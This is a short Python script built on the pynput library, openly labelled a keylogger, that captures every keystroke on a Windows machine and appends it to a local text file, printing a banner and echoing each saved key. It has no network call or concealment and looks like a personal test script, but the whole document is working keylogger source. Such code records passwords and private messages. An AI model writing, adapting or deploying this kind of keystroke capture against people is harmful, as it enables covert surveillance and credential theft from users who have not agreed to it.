from pynput.keyboard import Listener, Key
import os

log_file = r"C:\Users\Shahriar\Testlog.txt"

print("=" * 50)
print("KEYLOGGER STARTED")
print(f"Log file: {log_file}")
print("Type something to test...")
print("Press Ctrl+C to stop")
print("=" * 50)

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        if key == Key.space:
            key_str = " "
        elif key == Key.enter:
            key_str = "\n"
        elif key == Key.backspace:
            key_str = "[BS]"
        else:
            key_str = f"[{str(key)}]"
    
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key_str)
            f.flush()  # Immediately write to disk
        print(f"✓ Saved: {key_str}", end="", flush=True)
    except Exception as e:
        print(f"\n✗ Error writing: {e}")

# Create file if doesn't exist
try:
    if not os.path.exists(log_file):
        with open(log_file, "w", encoding="utf-8") as f:
            f.write("")
        print(f"✓ File created: {log_file}\n")
    else:
        print(f"✓ File exists: {log_file}\n")
except Exception as e:
    print(f"✗ Error creating file: {e}\n")

try:
    with Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n\n✓ Keylogger stopped!")
    print(f"Check file: {log_file}")